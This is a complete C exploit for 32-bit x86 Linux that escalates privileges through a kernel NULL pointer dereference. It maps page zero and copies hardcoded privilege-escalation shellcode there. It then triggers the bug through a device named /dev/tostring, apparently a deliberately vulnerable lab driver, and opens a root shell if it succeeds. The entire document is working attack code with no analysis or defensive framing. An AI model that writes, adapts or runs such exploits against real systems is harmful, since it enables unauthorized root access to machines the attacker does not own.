// Kernel x86 - Null ponter dereference
// gcc -m32 -static sploit.c sploit && chmod 755 sploit

#include <sys/mman.h>
#include <string.h> // memcpy
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>

int main() {
printf("[+] Try to allocat 0x00000000...\n");
  if (mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0) == (char *)-1){
    printf("[-] Failed to allocat 0x00000000\n");
    return -1;
  }
  printf("[+] Allocation success !\n");

printf("[+] Mapping fake stack at address 0x000000000000\n");
uint8_t *page = NULL;

printf("[+] Copy priv esc payload on fake stack\n");
char payload[] =
	"\x31\xc0\xe8\x9d\x0a\x04\xc1"
	"\xe8\xbb\x0b\04\xc1\xc3";
memcpy(page, payload, sizeof(payload));

  /* Trigger the kernel */
  char buff[100];
  printf("[+] Triggered a kernel NULL pointer dereference!\n");
  //int fd = open("/dev/tostring", O_WRONLY);
  int fd = open("/dev/tostring", O_RDWR);
  write(fd, "**********S", 11);
  read(fd,&buff,1);
  close(fd);

  /* Check if got root */
  if (getuid() == 0) {
      printf("[+] Got root !\n");
      char *argv[] = {"/bin/sh", NULL};
      execve("/bin/sh", argv, NULL);
  }

  fprintf(stderr, "Something went wrong?\n");
  return 1;

}
